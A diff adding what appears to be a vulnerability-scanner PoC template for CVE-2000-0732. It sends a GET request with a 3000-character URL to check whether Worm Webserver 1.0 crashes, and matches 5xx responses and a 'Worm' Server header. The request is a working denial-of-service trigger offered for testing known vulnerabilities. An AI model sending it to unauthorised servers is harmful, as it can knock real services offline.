@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "验证 Jeremy Arnold Worm Webserver 1.0 是否存在长 URL 导致的拒绝服务漏洞，发送超长 URL 请求触发服务器崩溃或资源耗尽"
+id = "POC-AVE-2000-0884"
+name = "CVE-2000-0732 PoC"
+severity = "medium"
+tags = ["ave-2000-0884"]
+vuln_id = [
+    "CVE-2000-0732",
+    "AVE-2000-0884",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = '/{{BaseURL}}/{{repeat("A", 3000)}}'
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = [
+    "Server:",
+    "Worm",
+]
